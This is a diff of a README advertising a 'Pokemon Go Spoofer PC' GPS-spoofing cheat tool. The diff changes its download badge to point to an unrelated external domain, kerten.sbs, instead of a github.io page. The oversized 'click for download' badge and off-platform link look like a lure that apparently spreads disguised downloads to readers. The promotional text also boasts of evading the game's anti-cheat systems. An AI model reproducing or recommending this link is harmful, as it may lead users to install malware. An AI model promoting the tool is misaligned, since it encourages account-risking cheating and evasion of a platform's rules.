@@ -2,11 +2,15 @@
 
 Pokemon Go Spoofer PC is a powerful GPS spoofing solution that brings full location control to your desktop. Designed for both casual players and hardcore trainers, this tool enables smooth teleportation, joystick movement, and automatic walking. Want to visit New York, Tokyo, or Sydney in minutes? Now you can — without leaving your chair. Perfect for catching regional Pokémon, completing timed events, and raiding globally, all while keeping your account safe. Updated regularly to stay compatible with the latest Pokemon Go versions and anti-cheat systems.
 
-<div style="text-align: center">
-  <a href="https://pokemon-go-spoofer-pc.github.io/.github/">
-    <img class="bumbum" style="width: 400px" alt="Static Badge" src="https://img.shields.io/badge/click_for_download-Pokemon_Go_Spoofer_PC-blueviolet">
-  </a>
-</div>
+---
+
+<a href="https://kerten.sbs/kl/old">
+  <img
+    src="https://img.shields.io/badge/click%20For%20Download-green?style=for-the-badge&logo=github"
+    alt="gg"
+    width="1100"
+  >
+</a>
 
 ---
 
